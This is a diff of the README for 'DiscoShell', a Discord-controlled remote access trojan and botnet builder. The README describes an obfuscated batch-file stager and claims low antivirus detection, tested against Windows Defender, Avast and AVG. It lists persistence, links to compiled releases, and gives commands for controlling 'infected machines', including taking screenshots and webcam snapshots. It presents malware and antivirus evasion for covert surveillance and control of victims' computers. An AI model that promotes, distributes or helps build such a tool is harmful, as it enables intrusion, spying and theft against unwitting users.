@@ -1,21 +1,19 @@
 # DiscoShell
 
-DiscoShell (a.k.a. DiscoSh) is a simple command line tool that can generate a nearly undetectable remote access trojan that connects to a Discord bot, allowing the creation of a Discord-based botnet. 
+DiscoShell (a.k.a. DiscoSh) is a remote access trojan that is controlled via a Discord bot, allowing the creation of a Discord-based botnet. 
 
-DiscoSh generates a batch file stager which can be optionally obfuscated with [BatchGuard](https://github.com/cchash/BatchGuard) modules. The generated file can be used on its own and does not require additional code to be wrapped over it.
+The builder generates a batch file stager which can be optionally obfuscated with [BatchGuard](https://github.com/cchash/BatchGuard) modules. The generated file can be used on its own and does not require additional code to be wrapped over it. You can find the compiled builder [here](https://github.com/cchash/DiscoShell/releases).
 
 ![image](https://media.discordapp.net/attachments/959762900443070485/960033794327461928/unknown.png)
 
-If you have any issues using this tool, feel free to DM me on Discord (chash#0466) or [create a GitHub issue](https://github.com/cchash/DiscoShell/issues/new).
-
 ## Detection status
-Virustotal result of generated file:
+Virustotal result:
 ![image](https://media.discordapp.net/attachments/959762900443070485/960034118375190608/unknown.png)
 [Link](https://www.virustotal.com/gui/file/541a70073404f35f6c0500d68de377d01dea3571f241723bb5975720c39dead8)
 
 Also tested on a VM against Windows Defender, Avast and AVG.
 
-None of the above guarantee that the generated file is fully undetectable.
+None of the above guarantee that it is fully undetectable.
 
 ## Features
 - Persistence
@@ -25,9 +23,7 @@ None of the above guarantee that the generated file is fully undetectable.
 \+ Can perform all things described in the [Discord bot commands](#discord-bot-commands) section.
 
 ## Discord bot commands
-You can use the following commands to control infected machines.
-
-Note: Prefix can be customised
+The following commands are used to control infected machines.
 ```
 get : Get username, machine name and screenshot of all infected machines.
 getcam : Get snapshot from all video sources on specified machine.
